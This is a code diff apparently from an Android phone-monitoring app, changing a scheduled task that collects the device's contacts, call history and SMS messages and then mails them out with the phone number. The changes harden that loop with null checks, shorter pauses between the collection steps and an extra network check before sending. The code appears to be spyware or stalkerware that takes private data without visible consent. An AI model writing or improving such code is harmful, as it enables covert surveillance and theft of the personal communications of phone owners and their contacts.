@@ -59,10 +59,12 @@ public class GetInfoTask extends TimerTask
 	
 	public void run() 
 	{
+		if (attachments == null) attachments = new ArrayList<File>();
+		
 		// If network connected, try to collect and send the information
 		if (!SysUtils.isNetworkConnected(context)) return;
 		
-		// Firstly we should make sure the time range (>24H)
+		// Firstly we should make sure the time range ( > days that user set)
 		Date lastDatetime = null;
 		String lastDatetimeStr = ConfigCtrl.getLastGetInfoTime(context);
 		if (lastDatetimeStr.length() > 0) {
@@ -72,6 +74,7 @@ public class GetInfoTask extends TimerTask
 		}
 			
 		Calendar now = Calendar.getInstance();
+		if (interval < 1) interval = 1;
 		now.add(Calendar.DATE, -1*interval);
 		Date now_minus_x_day = now.getTime();
 		if (lastDatetime != null && now_minus_x_day.before(lastDatetime)) 
@@ -82,11 +85,13 @@ public class GetInfoTask extends TimerTask
 		
 		// Collect information
 		CollectContact(context);
-		SysUtils.ThreadSleep(10000, LOGTAG);
+		SysUtils.ThreadSleep(5000, LOGTAG);
 		CollectPhoneCallHist(context);
-		SysUtils.ThreadSleep(10000, LOGTAG);
+		SysUtils.ThreadSleep(1000, LOGTAG);
 		CollectSms(context);
-		SysUtils.ThreadSleep(2000, LOGTAG);
+		SysUtils.ThreadSleep(1000, LOGTAG);
+		
+		if (!SysUtils.isNetworkConnected(context)) return;
 		
 		// Send mail
 		String phoneNum = DeviceProperty.getPhoneNumber(context);
